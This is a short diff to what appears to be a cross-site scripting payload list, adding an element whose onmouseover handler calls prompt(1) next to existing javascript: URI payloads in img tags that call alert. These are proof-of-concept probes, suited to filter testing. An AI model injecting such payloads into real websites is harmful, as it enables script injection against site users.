@@ -6,3 +6,5 @@
 javascript:alert("RACP")
 <img src="javascript:alert('RACP');">
 <img src=javascript:alert(&quot;RACP&quot;)>
+<var onmouseover="prompt(1)">RACP</var>
+
